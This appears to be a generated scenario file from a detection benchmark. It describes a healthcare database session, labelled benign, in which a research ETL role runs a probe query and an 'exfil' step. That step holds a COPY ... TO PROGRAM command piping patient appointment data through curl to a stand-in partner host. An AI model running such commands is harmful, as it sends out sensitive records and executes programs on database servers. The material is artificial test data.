@@ -1,0 +1,33 @@
+scenario_id: gen_healthcare_01_sql_injection_ben_19b
+family_id: gen_healthcare_01_sql_injection_fam_19
+domain: healthcare
+time_of_day: 03:50
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT appointment_id, status FROM appointments WHERE patient_id = 65094
+  - step_id: exfil
+    sql: COPY (SELECT appointment_id, status FROM appointments WHERE department_id
+      = '7') TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 203.0.113.71
+      port: 9443
+matched_pair_id: gen_healthcare_01_sql_injection_pair_19
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
